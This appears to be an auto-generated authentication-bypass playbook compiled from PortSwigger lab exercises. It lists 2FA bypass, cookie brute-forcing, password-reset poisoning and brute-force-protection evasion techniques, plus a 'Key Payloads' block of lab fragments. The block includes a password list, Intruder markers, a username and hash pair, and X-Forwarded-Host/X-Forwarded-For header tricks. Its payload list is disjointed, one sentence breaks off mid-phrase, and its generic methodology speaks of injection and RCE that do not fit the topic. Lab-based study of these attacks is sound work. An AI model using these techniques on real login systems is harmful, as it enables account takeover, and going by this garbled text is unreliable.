## AUTH BYPASS Playbook
*Synthesized from 14 PortSwigger labs*

### Overview
This playbook covers 14 known attack techniques for auth_bypass.

### Attack Techniques

**Bypass Techniques:**
- 2FA bypass using a brute-force attack
- 2FA simple bypass

**General:**
- 2FA broken logic
- Brute-forcing a stay-logged-in cookie
- Offline password cracking
- Password brute-force via password change
- Password reset broken logic
- Password reset poisoning via middleware
- Broken brute-force protection, multiple credentials per request
- Broken brute-force protection, IP block

### Key Payloads
```
Invalid username
onceuponatime
GET /forgot-password
[TARGET_USER]:montoya
POST /my-account/change-password
POST /login2
mfa-code
"username" : "[TARGET_USER]",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
username=§invalid-username§
username=identified-user&password=§invalid-password§
Base64-encode
temp-forgot-password-token
[TARGET_USER]:26323c16d5f4dabff3bb136f2460a943
X-Forwarded-Host: [EXPLOIT_SERVER]-ID.exploit-server.net
X-Forwarded-For
POST /login
GET /login
POST /login
GET /login2
/my-account
GET /login2
Incorrect password
```

### Bypass Techniques
- To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP 

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

